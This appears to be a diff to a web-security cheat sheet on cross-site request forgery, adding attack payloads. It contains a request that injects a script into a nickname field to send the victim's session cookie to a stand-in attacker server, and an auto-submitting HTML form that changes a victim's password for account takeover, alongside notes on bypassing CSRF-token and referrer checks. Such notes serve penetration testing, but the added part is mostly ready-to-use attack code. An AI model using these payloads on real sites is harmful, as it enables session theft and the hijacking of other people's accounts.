@@ -36,4 +36,25 @@ bypass csrf-token protection
 bypass referrer header check by 
 <meta name="referrer" content="no-referrer">
 
+Self XSS by CSRF
+POST /change_account_nickname
+Host: finance.example.com
+Cookie: session_cookie=YOUR_SESSION_COOKIE;
+(POST request body)
+account=0
+&nickname="<script>document.location='http://attacker_server_ip/
+cookie_stealer.php?c='+document.cookie;</script>"
+&csrf_token='' - leave blank
+
+injects XSS in nickname field and steals the cookies
+
+CSRF POC
+<html>
+<form method="POST" action="https://email.example.com/set_password" id="csrf-form">
+<input type="text" name="new_password" value="this_account_is_now_mine">
+<input type='submit' value="Submit">
+</form>
+<script>document.getElementById("csrf-form").submit();</script>
+</html>
+
 Bypass using XSS as mentioned in the XSS guide in this repo :)
